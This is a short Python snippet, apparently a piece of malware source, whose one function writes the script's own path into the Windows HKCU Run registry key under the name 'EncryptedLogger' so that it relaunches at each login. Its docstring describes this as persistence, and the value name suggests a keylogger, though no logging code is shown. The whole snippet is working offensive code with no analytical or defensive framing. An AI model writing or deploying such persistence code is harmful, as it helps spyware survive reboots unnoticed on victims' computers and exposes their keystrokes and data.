import os
import winreg

def add_to_registry():
    """Add script to Windows startup registry for persistence."""
    try:
        filepath = os.path.abspath(__file__)  # Gets full path of this script
        reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_ALL_ACCESS) as reg:
            winreg.SetValueEx(reg, "EncryptedLogger", 0, winreg.REG_SZ, filepath)
        print("[+] Persistence added via registry key.")
    except Exception as e:
        print("[!] Persistence setup failed:", e)
